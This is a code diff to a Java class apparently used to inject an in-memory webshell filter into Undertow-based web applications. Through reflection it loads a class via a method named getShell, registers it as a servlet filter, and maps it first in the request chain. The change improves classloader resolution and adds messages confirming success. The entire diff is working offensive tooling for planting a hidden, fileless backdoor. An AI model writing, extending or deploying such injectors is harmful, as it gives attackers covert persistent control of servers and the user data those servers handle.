@@ -60,12 +60,18 @@ public class UndertowFilterInjector {
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            Object deploymentInfo = getFieldValue(context, "deploymentInfo");
+            return ((ClassLoader) invokeMethod(deploymentInfo, "getClassLoader", null, null));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -79,9 +85,10 @@ public class UndertowFilterInjector {
 
     public void inject(Object context, Object filter) throws Exception {
         if (isInjected(context)) {
+            System.out.println("filter already injected");
             return;
         }
-        Class<?> filterInfoClass = Class.forName("io.undertow.servlet.api.FilterInfo", true, context.getClass().getClassLoader());
+        Class<?> filterInfoClass = context.getClass().getClassLoader().loadClass("io.undertow.servlet.api.FilterInfo");
         Object deploymentInfo = getFieldValue(context, "deploymentInfo");
         Object filterInfo = filterInfoClass.getConstructor(String.class, Class.class).newInstance(getClassName(), filter.getClass());
         invokeMethod(deploymentInfo, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
@@ -89,6 +96,7 @@ public class UndertowFilterInjector {
         Object managedFilters = invokeMethod(deploymentImpl, "getFilters", null, null);
         invokeMethod(managedFilters, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
         invokeMethod(deploymentInfo, "insertFilterUrlMapping", new Class[]{int.class, String.class, String.class, DispatcherType.class}, new Object[]{0, getClassName(), getUrlPattern(), DispatcherType.REQUEST});
+        System.out.println("filter inject success");
     }
 
     @SuppressWarnings("unchecked")
